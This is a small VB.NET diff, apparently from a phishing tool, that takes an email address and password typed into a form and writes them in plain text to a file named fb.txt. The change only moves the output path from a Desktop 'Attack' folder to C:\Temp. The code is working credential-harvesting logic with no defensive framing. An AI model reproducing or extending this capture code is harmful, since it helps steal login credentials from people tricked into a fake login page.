@@ -6,7 +6,7 @@
         Dim email As String = MyEmail.Text.ToString
         Dim pass As String = MyPass.Text.ToString
         Dim message As String = "Email: " + email + ", Password: " + pass
-        Dim fileName As String = "C:\\Users\\haozhenxiao\\Desktop\\Attack\\fb.txt"
+        Dim fileName As String = "C:\\Temp\\fb.txt"
         Dim file As System.IO.StreamWriter = New System.IO.StreamWriter(fileName)
         file.WriteLine(message)
         file.Close()
